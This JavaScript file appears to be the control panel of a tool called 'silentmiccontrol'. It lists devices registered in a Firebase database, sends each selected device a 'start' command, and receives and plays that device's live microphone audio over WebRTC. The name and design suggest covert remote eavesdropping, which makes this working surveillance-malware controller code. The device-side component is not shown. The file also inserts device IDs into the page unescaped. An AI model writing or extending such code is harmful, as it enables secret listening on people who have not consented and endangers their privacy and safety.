const firebaseConfig = {
  databaseURL: "https://silentmiccontrol-default-rtdb.firebaseio.com"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const deviceListDiv = document.getElementById("deviceList");

db.ref("devices").once("value").then(snapshot => {
  const devices = snapshot.val();
  deviceListDiv.innerHTML = "";

  if (!devices) {
    deviceListDiv.textContent = "No devices online.";
    return;
  }

  Object.keys(devices).forEach(deviceId => {
    const info = devices[deviceId].info || {};
    const btn = document.createElement("button");
    btn.textContent = `▶️ Listen to ${deviceId}`;
    btn.onclick = () => listenToDevice(deviceId);
    deviceListDiv.appendChild(btn);
  });
});

function listenToDevice(deviceId) {
  deviceListDiv.innerHTML = `Connecting to <b>${deviceId}</b>...`;

  const liveRef = db.ref(`live_audio/${deviceId}`);
  liveRef.child("command").set("start");

  const peer = new SimplePeer({ initiator: false, trickle: false });

  peer.on("signal", data => {
    liveRef.child("webrtc/answer").set({
      type: data.type,
      description: data.sdp
    });
  });

  liveRef.child("webrtc/offer").on("value", snapshot => {
    const offer = snapshot.val();
    if (offer && offer.type && offer.description) {
      peer.signal({ type: offer.type, sdp: offer.description });
    }
  });

  liveRef.child("webrtc/candidate").on("child_added", snap => {
    const candidate = snap.val();
    if (candidate) {
      peer.signal({
        candidate: candidate.sdp,
        sdpMid: candidate.sdpMid,
        sdpMLineIndex: candidate.sdpMLineIndex
      });
    }
  });

  peer.on("stream", stream => {
    const audio = new Audio();
    audio.srcObject = stream;
    audio.play();
    deviceListDiv.innerHTML = `<b>✅ Now listening to ${deviceId}</b>`;
  });

  peer.on("error", err => {
    console.error("Peer error", err);
    deviceListDiv.innerHTML = `<b>❌ Error connecting to ${deviceId}</b>`;
  });
}
